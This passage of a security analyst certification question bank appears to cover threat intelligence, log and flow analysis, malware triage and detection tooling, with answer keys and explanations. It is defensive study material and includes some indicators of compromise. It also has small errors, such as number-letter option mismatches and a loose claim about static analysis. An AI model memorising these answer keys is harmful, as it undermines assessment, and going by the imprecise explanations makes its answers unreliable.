        `"Unit 42 has discovered a new malware family we've named "Reaver" with ties to attackers who use SunOrcal malware. SunOrcal activity has been documented to at least 2013, and based on metadata surrounding some of the C2s, may have been active as early as 2010. The new family appears to have been in the wild since late 2016 and to date we have only identified 10 unique samples, indicating it may be sparingly used. Reaver is also somewhat unique in the fact that its final payload is in the form of a Control panel item, or CPL file. To date, only 0.006% of all malware seen by Palo Alto Networks employs this technique, indicating that it is in fact fairly rare.", "Tag": [{"colour": "#00223b", "exportable": true, "name": "osint:source-type=\"blog-post\""}], "disable_correlation": false, "object_relation": null, "type": "comment"}, {"comment": "", "category": "Persistence mechanism", "uuid": "5a0a9d47- 1c7c-4353-8523-440b950d210f", "timestamp": "1510922426", "to_ids": false, "value": "%COMMONPROGRAMFILES%\\services\\", "disable_correlation": false, "object_relation": null, "type": "regkey"}, {"comment": "", "category": "Persistence mechanism", "uuid": "5a0a9d47-808c-4833-b739-43bf950d210f", "timestamp": "1510922426", "to_ids": false, "value": "%APPDATA%\\microsoft\\mmc\\", "disable_correlation": false, "object_relation": null, "type": "regkey"}, {"comment": "", "category": "Persistence mechanism", "uuid": "5a0a9d47-91e0- 4fea-8a8d-48ce950d210f", "timestamp": "1510922426", "to_ids": false, "value": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ Shell Folders\\Common Startup"`

        How does the Reaver malware maintain persistence?

        1. A blog post
        2. Inserts itself into the Registry
        3. Installs itself as a runonce key
        4. Requests user permission to start up

        Answer:

        B. The question's description includes details about the use of the startup Registry entry for Common Startup and lists a Registry key. This means the Reaver malware as described maintains persistence by using a Registry key.
170.    Isaac's organization has deployed a security tool that learns how network users typically behave and then searches for differences that match attack behaviors. What type of system can automatically analyze this data to build detection capability like this?

        1. Signature-based analysis
        2. A Babbage machine
        3. Machine learning
        4. Artificial network analysis

        Answer:

        C. Machine learning (ML) in systems like this relies on datasets to build profiles of behavior that it then uses to identify abnormal behavior. They also use behavioral data that is frequently associated with attacks and malware and use that to compare to the user behavior patterns. Signature-based analysis uses hashing or other related techniques to verify if files match a known malware package. The Babbage machine is a mechanical computer, and artificial network analysis was made up for this question.
171.    What is the advantage of a SOAR system over a traditional SIEM system?

        1. SOAR systems are less complex to manage.
        2. SOAR systems handle large log volumes better using machine learning.
        3. SOAR systems integrate a wider range of internal and external systems.
        4. SOAR logs are transmitted only over secure protocols.

        Answer:

        C. Although SIEM and SOAR systems often have similar functionality, SOAR systems are typically designed to work with a broader range of internal and external systems, including threat intelligence feeds and other data sources, and then assist with the automation of responses.
172.    Fiona has continued her threat-hunting efforts and has formed a number of hypotheses. What key issue should she consider when she reviews them?

        1. The number of hypotheses
        2. Her own natural biases
        3. Whether they are strategic or operational
        4. If the attackers know about them

        Answer:

        B. A single analyst working alone is likely to have limitation to their knowledge, experience, and their own experiential biases. Thus, Fiona should review her hypotheses for her own natural biases and may want to involve other analysts or experts to help control for them.
173.    Nathan wants to determine which systems are sending the most traffic on his network. What low-overhead data-gathering methodology can he use to view traffic sources, destinations, and quantities?

        1. A network sniffer to view all traffic
        2. Implementing NetFlow
        3. Implementing SDWAN
        4. Implementing a network tap

        Answer:

        B. A NetFlow or sFlow implementation can provide Nathan with the data he needs. Flows show the source, destination, type of traffic, and amount of traffic, and if he collects flow information from the correct locations on his network, he will have the ability to see which systems are sending the most traffic and will also have a general idea of what the traffic is. A sniffer requires more resources, whereas SDWAN is a software-defined wide area network, which might provide some visibility but does not necessarily meet his needs. Finally, a network tap is used to capture data, but a tap alone does not analyze or provide this information.
174.    Adam is reviewing a Wireshark packet capture in order to perform protocol analysis, and he notes the following data in the Wireshark protocol hierarchy statistics. What percentage of traffic is most likely encrypted web traffic?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf015.jpg)

        1. 85.9 percent
        2. 1.7 percent
        3. 20.3 percent
        4. 1.9 percent

        Answer:

        C. The Transport Layer Security entry shows 20.3 percent of the traffic was sent over TLS. Although this may not all be encrypted web traffic, the likely answer is that the majority of it is.
175.    Annie is reviewing a packet capture that she believes includes the download of malware. What host should she investigate further as the source of the malware based on the activity shown in the following image from her packet analysis efforts?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf016.jpg)

        1. 172.17.8.8
        2. 49.51.172.56
        3. 172.17.8.172
        4. 56.172.51.49

        Answer:

        B. A binary file is downloaded from 49.51.172.56, as shown by the `GET` command for `nCvQOQHCBjZFfiJvyVGA/yrkbdmt.bin`. Annie should mark this as an indicator of compromise (IoC) and look for other traffic to or from this host, as well as what the workstation or system it is downloaded to does next.
176.    Steve uploads a malware sample to an analysis tool and receives the following messages:

        `>Executable file was dropped: C:\Logs\mffcae1.exe >Child process was created, parent C:\Windows\system32\cmd.exe >mffcae1.exe connects to unusual port >File downloaded: cx99.exe`

        If he wanted to observe the download behavior himself, what is the best tool to capture detailed information about what occurs?

        1. An antimalware tool
        2. Wireshark
        3. An IPS
        4. Network flows

        Answer:

        B. Steve could use Wireshark to capture the download traffic and to observe what host the file was downloaded from. Antimalware tools typically remove the malware but do not provide detailed visibility into its actions. An IPS can detect attacks but would need specific rules to detect the actions taken. Network flows will show where the traffic went but will not provide detailed specifics like a packet capture tool would.
177.    Abdul is analyzing proxy logs from servers that run in his organization and notices two proxy log servers have entries for similar activities that always occur one hour apart from each other. Both proxy servers are in the same datacenter, and the activity is part of a normal evening process that runs at 7 p.m. One proxy server records the data at 7 p.m., and one records the entry at 6 p.m. What issue has Abdul likely encountered?

        1. A malware infection emulating a legitimate process
        2. An incorrect time zone setting
        3. A flaw in the automation script
        4. A log entry error

        Answer:

        B. A relatively common issue during log reviews is incorrect or mismatched time zone settings. Many organizations that operate in more than one time zone use Universal Time Coordinated (UTC) to avoid having to do time zone corrections when comparing logs. In this case, Abdul should check the server that is recording the events at 6 p.m. to see if it is set to the wrong time zone or otherwise is misconfigured to have the wrong system time.
178.    Eric is performing threat intelligence work and wants to characterize a threat actor that his organization has identified. The threat actor is similar to the group known as Anonymous and has targeted organizations for political reasons in the past. How should he characterize this threat actor?

        1. Unwitting insiders
        2. Unknown
        3. APT
        4. Hacktivist

        Answer:

        D. Anonymous and other politically motivated groups are typically classified as hacktivists because their attacks are motivated for political or other activist reasons.
179.    What do DLP systems use to classify data and to ensure that it remains protected?

        1. Data signatures
        2. Business rules
        3. Data egress filters
        4. Data at rest

        Answer:

        B. Data loss prevention (DLP) systems use business rules that define when and how data is allowed to move around an organization, as well as how it should be classified. Data at rest is data that is not moving, and the remaining options were made up for this question.
180.    Benicio wants to implement a tool for all the workstations and laptops in his company that can combine behavioral detection attack indicators based on current threat intelligence with real-time visibility into the systems. What sort of tool should he select?

        1. An IPS
        2. An EDR
        3. A CRM
        4. A UEBA

        Answer:

        B. Endpoint detection and response (EDR) tools are integrated security solutions that monitor endpoint systems and collect activity data and then use threat intelligence and behavior to automatically respond by removing or quarantining potential threats. EDR tools can also be helpful for forensic analysis and incident response. An IPS would be useful for monitoring network traffic, a CRM is a customer relationship management tool, and a UEBA would capture user behavior but does not have the same threat intelligence and response capabilities that an EDR has.
181.    Eric wants to analyze a malware binary in the safest way possible. Which of the following methods has the least likelihood of allowing the malware to cause problems?

        1. Running the malware on an isolated VM
        2. Performing dynamic analysis of the malware in a sandbox
        3. Performing static analysis of the malware
        4. Running the malware in a container service

        Answer:

        C. Although you can build an isolated sandbox or VM, the safest way to analyze malware is to analyze the source code rather than running it. Thus, static analysis is the safest answer, but it may not be as useful as dynamic analysis where you can capture what the malware does as it happens. Static analysis can also be significantly slower because of the effort required to disassemble the code and reverse-engineer what it is doing.
182.    Tom wants to improve his detection capabilities for his software-as-a-service (SaaS) environment. What technology is best suited to give him a view of usage, data flows, and other details for cloud environments?

        1. EDR
        2. CASB
        3. IDS
        4. SIEM

        Answer:

        B. A cloud access security broker (CASB) is the ideal tool to increase Tom's visibility into cloud services. CASB tools are specifically designed to monitor for cloud access patterns and to ensure that unwanted activity does not occur.
183.    Juan wants to audit filesystem activity in Windows and configures Windows filesystem auditing. What setting can he set to know if a file was changed or not using Windows file auditing?

        1. Set Detect Change
        2. Set Validate File Versions
        3. Set Audit Modifications
        4. None of the above

        Answer:

        D. Windows filesystem auditing does not provide the ability to detect if files were changed. Forensic artifacts can indicate that a file was opened and identify the program that opened it. However, unlike tools such as Tripwire that track file hashes and thus can identify modifications, Windows file auditing cannot provide this detail.
184.    Naomi wants to analyze URLs found in her passive DNS monitoring logs to find domain generation algorithm (DGA)–generated command-and-control links. What techniques are most likely to be useful for this?

        1. WHOIS lookups and NXDOMAIN queries of suspect URLs
        2. Querying URL allowlists
        3. DNS probes of command-and-control networks
        4. Natural language analysis of domain names

        Answer:

        A. URL analysis of domain generation algorithm–created uniform resource locators (URLs) relies on either testing URLs via WHOIS lookups and NXDOMAIN responses or using machine learning (ML) techniques, which recognize patterns common to DGA-generated URLs. Natural language processing focuses on understanding natural language data, but DGAs do not rely on natural language–style URLs in most cases.
185.    Kathleen wants to ensure that her team of security analysts sees important information about the security status of her organization whenever they log in to the SIEM. What part of a SIEM is designed to provide at-a-glance status information using the “single pane of glass” approach?

        1. The reporting engine
        2. Email reports
        3. The dashboard
        4. The ruleset

        Answer:

        C. The SIEM dashboard is the first thing you see when you log in to almost any SIEM product. Configuring dashboards to provide the most relevant and useful information is an important activity for more SIEM operations staff. The reporting engine is useful for more in-depth detail and also typically helps feed the dashboard. Email reports can be useful to ensure regular delivery to users who may not have an account on the SIEM or for other purposes where an event-driven or schedule-driven report is useful. A SIEM ruleset defines what a SIEM does and when, but it isn't useful for a quick view.
186.    Lucca is reviewing bash command history logs on a system that he suspects may have been used as part of a breach. He discovers the following `grep` command run inside of the `/users` directory by an administrative user. What will the command find?

        `Grep -r "sudo" /home/users/ | grep "bash.log"`

        1. All occurrences of the `sudo` command on the system
        2. All occurrences of root logins by users
        3. All occurrences of the `sudo` command in bash log files in user home directories
        4. All lines that do not contain the word `sudo` or `bash.log` in user directories

        Answer:

        C. In this scenario, the attacker may have been trying to find users who have typed credentials into a `sudo` command in a script. This will find all occurrences of the `sudo` command in all the `/home/users` subdirectories and will then feed that output to a search for `bash.log`, meaning that only occurrences of `sudo` inside of `bash.log` entries will be returned.
187.    Cynthia wants to build scripts to detect malware beaconing behavior. Which of the following is not a typical means of identifying malware beaconing behavior on a network?

        1. Persistence of the beaconing
        2. Beacon protocol
        3. Beaconing interval
        4. Removal of known traffic

        Answer:

        B. Unless she already knows the protocol that a particular beacon uses, filtering out beacons by protocol may cause her to miss beaconing behavior. Attackers want to dodge common analytical tools and will use protocols that are less likely to attract attention. Filtering network traffic for beacons based on the intervals and frequency they are sent at, if the beacon persists over time, and removing known traffic are common means of filtering traffic to identify beacons.
188.    Eric has access to a full suite of network monitoring tools and wants to use appropriate tools to monitor network bandwidth consumption. Which of the following is not a common method of monitoring network bandwidth usage?

        1. SNMP
        2. Portmon
        3. Packet sniffing
        4. NetFlow

        Answer:

        B. SNMP, packet sniffing, and NetFlow are commonly used when monitoring bandwidth consumption. Portmon is an aging Windows tool used to monitor serial and parallel ports, not exactly the sort of tool you'd use to watch your network's bandwidth usage!
189.    Kelly sees high CPU utilization in the Windows Task Manager, as shown here, while reviewing a system's performance issues. If she wants to get a detailed view of the CPU usage by application, with PIDs and average CPU usage, what native Windows tool can she use to gather that detail?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf017.jpg)

        1. Resource Monitor
        2. Task Manager
        3. `iperf`
        4. Perfmon

        Answer:

        A. Resource Monitor provides average CPU utilization in addition to real-time CPU utilization. It also breaks out data by specific processes. Since Kelly wants to see average usage over time, she is better off using Resource Monitor instead of Task Manager (which meets all of her other requirements). Performance Monitor is useful for collecting performance data but only in summary form, and `iperf` is a network performance measurement tool.
190.    Roger's monitoring system provides Windows memory utilization reporting. Use the chart shown here to determine what actions Roger should take based on his monitoring.

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf018.jpg)

        1. The memory usage is stable and can be left as it is.
        2. The memory usage is high and must be addressed.
        3. Roger should enable automatic memory management.
        4. There is not enough information to make a decision.

        Answer:

        A. Roger has memory usage monitoring enabled with thresholds shown at the bottom of the chart that will generate an alarm if it continues. The chart shows months of stable memory utilization with very little deviation. Although a sudden increase could happen, this system appears to be functioning well.
191.    NIST defines five major types of threat information in NIST SP 800-150, “Guide to Cyber Threat Information Sharing.”

        1. Indicators, which are technical artifacts or observables that suggest an attack is imminent, currently underway, or compromise may have already occurred
        2. Tactics, techniques, and procedures that describe the behavior of an actor
        3. Security alerts like advisories and bulletins
        4. Threat intelligence reports that describe actors, systems, and information being targeted and the methods being used
        5. Tool configurations that support collection, exchange, analysis, and use of threat information

        Which of these should Frank seek out to help him best protect the midsize organization he works for against unknown threats?

        1. 1, 2, and 5
        2. 1, 3, and 5
        3. 2, 4, and 5
        4. 1, 2, and 4

        Answer:

        B. The more effort Frank puts into staying up to date with information by collecting threat information (5), monitoring for indicators (1), and staying up-to-date on security alerts (3), the stronger his organization's security will be. Understanding specific threat actors may become relevant if they specifically target organizations like Frank's, but as a midsize organization, Frank's employer is less likely to be specifically targeted directly.
192.    Deepa is diagnosing major network issues at a large organization and sees the following graph in her PRTG console on the “outside” interface of her border router. What can Deepa presume has occurred?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf019.jpg)

        1. The network link has failed.
        2. A DDoS is in progress.
        3. An internal system is transferring a large volume of data.
        4. The network link has been restored.

        Answer:

        D. A sudden resumption of traffic headed “in” after sitting at zero likely indicates a network link or route has been repaired. A link failure would show a drop to zero, rather than an increase. The complete lack of inbound traffic prior to the resumption at 9:30 makes it unlikely this is a DDoS, and the internal systems are not sending significant traffic outbound.
193.    Angela wants to use her network security device to detect potential beaconing behavior. Which of the following options is best suited to detecting beaconing using her network security device?

        1. Antivirus definitions
        2. File reputation
        3. IP reputation
        4. Static file analysis

        Answer:

        C. Angela's best choice would be to implement IP reputation to monitor for connections to known bad hosts. Antivirus definitions, file reputation, and static file analysis are all useful for detecting malware, but command-and-control traffic like beaconing will typically not match definitions, won't send known files, and won't expose files for analysis.
194.    A server in the datacenter that Chris is responsible for monitoring unexpectedly connects to an offsite IP address and transfers 9 GB of data to the remote system. What type of monitoring should Chris enable to best assist him in detecting future events of this type?

        1. Flow logs with heuristic analysis
        2. SNMP monitoring with heuristic analysis
        3. Flow logs with signature-based detection
        4. SNMP monitoring with signature-based detection

        Answer:

        A. Flow logs would show Chris outbound traffic flows based on remote IP addresses as well as volume of traffic, and behavioral (heuristic) analysis will help him to alert on similar behaviors. Chris should build an alert that alarms when servers in his datacenter connect to domains that are not already allowlisted and should strongly consider whether servers should be allowed to initiate outbound connections at all.
195.    While reviewing his network for rogue devices, Dan notes that for three days a system with MAC address D4:BE:D9:E5:F9:18 has been connected to a switch in one of the offices in his building. What information can this provide Dan that may be helpful if he conducts a physical survey of the office?

        1. The operating system of the device
        2. The user of the system
        3. The vendor that built the system
        4. The type of device that is connected

        Answer:

        C. Dan can look up the manufacturer prefix that makes up the first part of the MAC address. In this case, Dan will discover that the system is likely a Dell, potentially making it easier for him to find the machine in the office. Network management and monitoring tools build in this identification capability, making it easier to see if unexpected devices show up on the network. Of course, if the local switch is a managed switch, he can also query it to determine what port the device is plugged into and follow the network cable to it.
196.    While checking for bandwidth consumption issues, Bohai uses the `ifconfig` command on the Linux box that he is reviewing. He sees that the device has sent less than 4 GB of data, but his network flow logs show that the system has sent more than 20 GB. What problem has Bohai encountered?

        1. A rootkit is concealing traffic from the Linux kernel.
        2. Flow logs show traffic that does not reach the system.
        3. `ifconfig` resets traffic counters at 4 GB.
        4. `ifconfig` only samples outbound traffic and will not provide accurate information.

        Answer:

        C. The traffic values captured by `ifconfig` reset at 4 GB of data, making it an unreliable means of assessing how much traffic a system has sent when dealing with large volumes of traffic. Bohai should use an alternate tool designed specifically to monitor traffic levels to assess the system's bandwidth usage.
197.    Vlad believes that an attacker may have added accounts and attempted to obtain extra rights on a Linux workstation. Which of the following is not a common way to check for unexpected accounts like this?

        1. Review `/etc/passwd` and `/etc/shadow` for unexpected accounts.
        2. Check `/home/` for new user directories.
        3. Review `/etc/sudoers` for unexpected accounts.
        4. Check `/etc/groups` for group membership issues.

        Answer:

        B. It is unlikely that skilled attackers will create a new home directory for an account they want to hide. Checking `/etc/password` and `/etc/shadow` for new accounts is a quick way to detect unexpected accounts, and checking both the `sudoers` and membership in wheel and other high-privilege groups can help Vlad detect unexpected accounts with increased privileges.
198.    Ben wants to coordinate with other organizations in the information security community to share data and current events as well as warnings of new security issues. What type of organization should he join?

        1. An ISAC
        2. A CSIRT
        3. A VPAC
        4. An IRT

        Answer:

        A. Information sharing and analysis centers (ISACs) are information sharing and community support organizations that work within vertical industries such as energy, higher education, and other business domains. Ben may choose to have his organization join an ISAC to share and obtain information about threats and activities that are particularly relevant to what his organization does. A CSIRT is a computer security incident response team and tends to be hosted in a single organization, a VPAC is made up, and an IRT is an incident response team.
199.    While investigating a spam email, Adam is able to capture headers from one of the email messages that was received. He notes that the sender was Carmen Victoria Garci. What facts can he gather from the headers shown here?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf020.jpg)

        1. Victoria Garci's email address is [tntexpress819@yahoo.com](mailto:tntexpress819@yahoo.com).
        2. The sender sent via Yahoo.
        3. The sender sent via a system in Japan.
        4. The sender sent via Gmail.

        Answer:

        C. Headers can be helpful when tracking down spam email, but spammers often use a number of methods to obfuscate the original sender's IP address, email, or other details. Unfortunately, email addresses are often spoofed, and the email address may be falsified. In this case, the only verifiable information in these headers is the IP address of the originating host, `mf-smf-ucb011.ocn.ad.jp (mf-smf-ucb011.ocn.ad.jp) [153.149.228.228]`. At times even this detail can be forged, but in most cases, this is simply a compromised host or one with an open email application that spammers can leverage to send bulk email.
200.    After submitting a suspected malware package to VirusTotal, Damian receives the following results. What does this tell Damian?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf021.jpg)

        1. The submitted file contains more than one malware package.
        2. Antivirus vendors use different names for the same malware.
        3. VirusTotal was unable to specifically identify the malware.
        4. The malware package is polymorphic, and matches will be incorrect.

        Answer:

        B. Each antivirus or antimalware vendor uses their own name for malware, resulting in a variety of names showing for a given malware package or family. In this case, the malware package is a ransomware package; that is known by some vendors as GoldenEye or Petya.
201.    Laura needs to check on CPU, disk, network, and power usage on a Mac. What GUI tool can she use to check these?

        1. Resource Monitor
        2. System Monitor
        3. Activity Monitor
        4. Sysradar

        Answer:

        C. The built-in macOS utility for measuring memory, CPU, disk, network, and power usage is Activity Monitor. Windows uses Resource Monitor, Sysradar was made up for this question, and System Monitor is used to collect information from Microsoft's SQL Server via RPC.
202.    Nara is reviewing event logs to determine who has accessed a workstation after business hours. When she runs `secpol.msc` on the Windows system she is reviewing, she sees the following settings. What important information will be missing from her logs?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf022.jpg)

        1. Login failures
        2. User IDs from logins
        3. Successful logins
        4. Times from logins

        Answer:

        C. The system Nara is reviewing has only login failure logging turned on and will not capture successful logins. She cannot rely on the logs to show her who logged in but may be able to find other forensic indicators of activity, including changes in the user profile directories and application caches.
203.    Profiling networks and systems can help to identify unexpected activity. What type of detection can be used once a profile has been created?

        1. Dynamic analysis
        2. Anomaly analysis
        3. Static analysis
        4. Behavioral analysis

        Answer:

        B. Profiling networks and systems will provide a baseline behavior set. A SIEM or similar system can monitor for differences or anomalies that are recorded as events. Once correlated with other events, these can be investigated and may prove to be security incidents. Dynamic and static analyses are types of code analysis, whereas behavioral, or heuristic, analysis focuses on behaviors that are indicative of an attack or other undesirable behavior. Behavioral analysis does not require a baseline; instead, it requires knowing what behavior is not acceptable.
204.    Singh is attempting to diagnose high memory utilization issues on a macOS system and notices a chart showing memory pressure. What does memory pressure indicate for macOS when the graph is yellow and looks like the following image?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf023.jpg)

        1. Memory resources are available.
        2. Memory resources are available but being tasked by memory management processes.
        3. Memory resources are in danger, and applications will be terminated to free up memory.
        4. Memory resources are depleted, and the disk has begun to swap.

        Answer:

        B. Memory pressure is a macOS-specific term used to describe the availability of memory resources. Yellow segments on a memory pressure chart indicate that memory resources are still available but are being tasked by memory management processes such as compression.
205.    Saanvi needs to verify that his Linux system is sending system logs to his SIEM. What method can he use to verify that the events he is generating are being sent and received properly?

        1. Monitor traffic by running Wireshark or `tcpdump` on the system.
        2. Configure a unique event ID and send it.
        3. Monitor traffic by running Wireshark or `tcpdump` on the SIEM device.
        4. Generate a known event ID and monitor for it.

        Answer:

        D. Saanvi simply needs to generate a known event ID that he can uniquely verify. Once he does, he can log into the SIEM and search for that event at the time he generated it to validate that his system is sending syslogs.
206.    Maria wants to understand what a malware package does and executes it in a virtual machine that is instrumented using tools that will track what the program does, what changes it makes, and what network traffic it sends while allowing her to make changes on the system or to click files as needed. What type of analysis has Maria performed?

        1. Manual code reversing
        2. Interactive behavior analysis
        3. Static property analysis
        4. Dynamic code analysis

        Answer:

        B. Maria has performed interactive behavior analysis. This process involves executing a file in a fully instrumented environment and then tracking what occurs. Maria's ability to interact with the file is part of the interactive element and allows her to simulate normal user interactions as needed or to provide the malware with an environment where it can interact like it would in the wild.
207.    Alyssa is analyzing a piece of malicious code that has arrived in her organization and finds that it is an executable file. She uses specialized tools to retrieve the source code from the executable files. What type of action is she taking?

        1. Sandboxing
        2. Reverse engineering
        3. Fingerprinting
        4. Darknet analysis

        Answer:

        B. Alyssa is using reverse engineering to analyze the functioning of an executable file. Sandboxing would be used to observe the malicious code's behavior. Fingerprinting is used to compare the signature of the file to other known malicious files. Darknets are used to identify malicious traffic and aren't used in this way.
208.    A major new botnet infection that uses a peer-to-peer command-and-control process has been released. Latisha wants to detect infected systems but knows that peer-to-peer communication is irregular and encrypted. If she wants to monitor her entire network for this type of traffic, what method should she use to catch infected systems?

        1. Build an IPS rule to detect all peer-to-peer communications that match the botnet's installer signature.
        2. Use beaconing detection scripts focused on the command-and-control systems.
        3. Capture network flows for all hosts and use filters to remove normal traffic types.
        4. Immediately build a network traffic baseline and analyze it for anomalies.

        Answer:

        C. The only solution from Latisha's list that might work is to capture network flows, remove normal traffic, and then analyze what is left. Peer-to-peer botnets use rapidly changing control nodes and don't rely on a consistent, identifiable control infrastructure, which means that traditional methods of detecting beaconing will typically fail. They also use quickly changing infection packages, making signature-based detection unlikely to work. Finally, building a network traffic baseline after an infection will typically make the infection part of the baseline, resulting in failure to detect malicious traffic.
209.    While investigating a compromise, Jack discovers four files that he does not recognize and believes may be malware. What can he do to quickly and effectively check the files to see whether they are malware?

        1. Submit them to a site like VirusTotal.
        2. Open them using a static analysis tool.
        3. Run strings against each file to identify common malware identifiers.
        4. Run a local antivirus or antimalware tool against them.

        Answer:

        A. Online tools like VirusTotal, MetaScan, and other online malware scanners use multiple antivirus and antimalware engines to scan files. This means they can quickly identify many malware packages. Static analysis of malware code is rarely quick and requires specialized knowledge to unpack or deobfuscate the files in many cases. Running strings can be helpful to quickly pick out text if the code is not encoded in a way that prevents it but is not a consistently useful technique. Running local antivirus or antimalware can be helpful but has a lower success rate than a multi-engine tool.
210.    Brian's network suddenly stops working at 8:40 a.m., interrupting videoconferences, streaming, and other services throughout his organization, and then resumes functioning. When Brian logs into his PRTG console and checks his router's traffic via the primary connection's redundant network link, he sees the following graph. What should Brian presume occurred based on this information?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf024.jpg)

        1. The network failed and is running in cached mode.
        2. There was a link card failure, and the card recovered.
        3. His primary link went down, and he should check his secondary link for traffic.
        4. PRTG stopped receiving flow information and needs to be restarted.

        Answer:

        C. This image represents an actual situation that involved a severed fiber link. Checking the secondary link would show that traffic failed over to the secondary link after a few minutes of failed connection attempts. This diagram is not sufficient to determine whether Brian has a caching server in place, but normal traffic for streaming services and videoconferences wouldn't work via a cache. If the link had failed and the card or device recovered on the same link, a resumption of normal traffic would appear. PRTG has continued to get small amounts of traffic, indicating that it is still receiving some information.
211.    Adam works for a large university and sees the following graph in his PRTG console when looking at a yearlong view. What behavioral analysis could he leverage based on this pattern?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf025.jpg)

        1. Identify unexpected traffic during breaks like the low point at Christmas.
        2. He can determine why major traffic drops happen on weekends.
        3. He can identify top talkers.
        4. Adam cannot make any behavioral determinations based on this chart.

        Answer:

        A. Adam will quickly note that weekends see small drops, but Christmas vacation and summer break both see significant drops in overall traffic. He can use this as a baseline to identify unexpected traffic during those times or to understand what student and faculty behavior mean to his organization's network usage.
212.    Samantha is preparing a report describing the common attack models used by advanced persistent threat actors. Which of the following is a typical characteristic of APT attacks?

        1. They involve sophisticated DDoS attacks.
        2. They quietly gather information from compromised systems.
        3. They rely on worms to spread.
        4. They use encryption to hold data hostage.

        Answer:

        B. Advanced persistent threats often leverage email, phishing, or a vulnerability to access systems and insert malware. Once they have gained a foothold, APT threats typically work to gain access to more systems with greater privileges. They gather data and information and then exfiltrate that information while working to hide their activities and maintain long-term access. DDoS attacks, worms, and encryption-based extortion are not typical APT behaviors.
213.    While reviewing system logs, Charles discovers that the processor for the workstation he is reviewing has consistently hit 100 percent processor utilization by the web browser. After reviewing the rest of the system, no unauthorized software appears to have been installed. What should Charles do next?

        1. Review the sites visited by the web browser when the CPU utilization issues occur.
        2. Check the browser binary against a known good version.
        3. Reinstall the browser.
        4. Disable TLS.

        Answer:

        A. Malicious sites may run scripts intended to mine cryptocurrency or to perform other actions when they are visited or ads execute code, resulting in high processor consumption. Charles should review the sites that were visited and check them against a trusted site list tool or a reputation tool. The scenario described does not indicate that checking the binary will help, and reinstalling a browser isn't typically part of the response for high CPU usage. Disabling TLS is a terrible idea, and modern CPUs shouldn't have an issue handling secure sites.
214.    Barb wants to detect unexpected output from the application she is responsible for managing and monitoring. What type of tool can she use to detect unexpected output effectively?

        1. A log analysis tool
        2. A behavior-based analysis tool
        3. A signature-based detection tool
        4. Manual analysis

        Answer:

        B. Barb can configure a behavior-based analysis tool that can capture and analyze normal behavior for her application and then alert her when unexpected behavior occurs. Although this requires initial setup, it requires less long-term work than constant manual monitoring, and unlike signature-based or log analysis-based tools, it will typically handle unexpected outputs appropriately.
215.    Greg suspects that an attacker is running an SSH server on his network over a nonstandard port. What port is normally used for SSH communications?

        1. 21
        2. 22
        3. 443
        4. 444

        Answer:

        B. SSH communications normally take place over TCP port 22. Attackers may try to run SSH servers over different ports to avoid detection.
216.    Amanda is reviewing the security of a system that was previously compromised. She is searching for signs that the attacker has achieved persistence on the system. Which one of the following should be her highest priority to review?

        1. Scheduled tasks
        2. Network traffic
        3. Running processes
        4. Application logs

        Answer:

        A. Attackers commonly use scheduled tasks to achieve persistence. If an analyst forgets to check for scheduled tasks, attackers may leave a task scheduled that opens up a vulnerability at a later date, achieving persistence on the system.
217.    Brendan is reviewing a series of syslog entries and notices several with different logging levels. Which one of the following messages should he review first?

        1. Level 0
        2. Level 1
        3. Level 5
        4. Level 7

        Answer:

        A. Syslog levels identify the urgency of the message and are numbered from 0 through 7. The highest level is level 0, which is designated as an emergency message. Syslog level 1 messages are alerts, level 2 messages are critical messages, level 3 messages are errors, level 4 messages are warnings, level 5 messages are notices, level 6 messages are informational, and level 7 is for debugging messages.
218.    You are looking for operating system configuration files that are stored on a Linux system. Which one of the following directories is most likely to contain those files?

        1. `/bin`
        2. `/`
        3. `/etc`
        4. `/dev`

        Answer:

        C. The `/etc` directory normally contains system-level configuration files. Files are generally not stored at the root level (`/`) of a file system. The `/bin` directory is used for binary executables, and the `/dev` directory is used for devices.
219.    Which one of the following is not a standard Windows system process?

        1. `SERVICES.EXE`
        2. `MALWARESCAN.EXE`
        3. `WINLOGIN.EXE`
        4. `LSASS.EXE`

        Answer:

        B. `MALWARESCAN.EXE` is not a standard Windows system process and should be investigated if found on a system. `SERVICES.EXE` is the Windows Service Control Manager. `WINLOGIN.EXE` is the Windows Login Process. `LSASS.EXE` is the Local Security Authority Subsystem Service.
220.    Which one of the following computer hardware components is responsible for executing instructions found in code?

        1. RAM
        2. CPU
        3. SSD
        4. HDD

        Answer:

        B. The central processing unit (CPU) is responsible for executing commands issued by the operating system or application code. Random access memory (RAM) is used to temporarily store data needed by the CPU. Solid-state drives (SSDs) and magnetic hard disk drives (HDDs) are long-term storage devices.
221.    You are deciding where to place a web server in an on-premises network architecture. The server will be accessible by the general public. Which one of the following network zones would be the most appropriate?

        1. Intranet subnet
        2. Internet subnet
        3. Screened subnet
        4. Database subnet

        Answer:

        C. Servers that are accessible by the general public should be placed on a screened subnet (also known as a _demilitarized zon_e (DMZ)), which is a network designed for this purpose. Servers located on more restrictive subnets, such as an intranet or database subnet, should not be directly accessible from the Internet. Servers should not be placed on the Internet zone because then they would not be protected by the organization's firewall and other perimeter security controls.
222.    Matthew is reviewing a new cloud service offering that his organization plans to adopt. In this offering, a cloud provider will create virtual server instances under the multitenancy model. Each server instance will be accessible only to Matthew's company. What cloud deployment model is being used?

        1. Hybrid cloud
        2. Public cloud
        3. Private cloud
        4. Community cloud

        Answer:

